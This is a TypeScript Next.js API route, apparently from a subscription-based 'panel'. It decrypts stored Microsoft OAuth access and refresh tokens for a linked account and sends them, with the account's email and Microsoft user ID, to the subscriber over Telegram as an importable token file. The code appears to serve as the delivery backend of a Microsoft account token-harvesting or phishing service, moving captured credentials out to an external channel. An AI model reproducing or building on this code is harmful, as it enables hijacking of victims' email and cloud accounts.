import { NextRequest, NextResponse } from "next/server";
import { prisma } from "@/lib/prisma";
import { requireActiveSubscription } from "@/lib/auth";
import { decrypt } from "@/lib/encryption";
import { sendTelegramNotification, sendTelegramDocument } from "@/lib/telegram";

export async function POST(
  _request: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  let userId: string;
  try {
    userId = await requireActiveSubscription();
  } catch (err) {
    const message = err instanceof Error ? err.message : "Unknown";
    if (message === "SUBSCRIPTION_REQUIRED") return NextResponse.json({ error: "Active subscription required" }, { status: 403 });
    return NextResponse.json({ error: "Unauthorized" }, { status: 401 });
  }

  const { id } = await params;

  const account = await prisma.linkedAccount.findFirst({
    where: { id, userId },
  });

  if (!account) {
    return NextResponse.json({ error: "Not found" }, { status: 404 });
  }

  const connectedEmail = account.email;
  const displayName = account.displayName || connectedEmail;
  const now = new Date();

  const message = [
    `🔔 <b>TOKEN RESEND</b>`,
    `${displayName}`,
    `${connectedEmail}`,
    `${now.toISOString().replace("T", " ").slice(0, 19)} UTC`,
  ].join("\n");

  const sent = await sendTelegramNotification(userId, message);

  if (!sent) {
    return NextResponse.json({ error: "Telegram not configured or failed to send" }, { status: 400 });
  }

  const tokenFileContent = JSON.stringify({
    access_token: decrypt(account.accessToken),
    refresh_token: decrypt(account.refreshToken),
    user_email: connectedEmail,
    display_name: displayName,
    microsoft_user_id: account.microsoftUserId,
    token_expires_at: account.tokenExpiresAt.toISOString(),
  }, null, 2);

  const safeEmail = connectedEmail.replace("@", "_at_");
  await sendTelegramDocument(
    userId,
    tokenFileContent,
    `${safeEmail}_token.txt`,
    "Import this file if the token doesn't appear in your panel"
  );

  return NextResponse.json({ success: true });
}
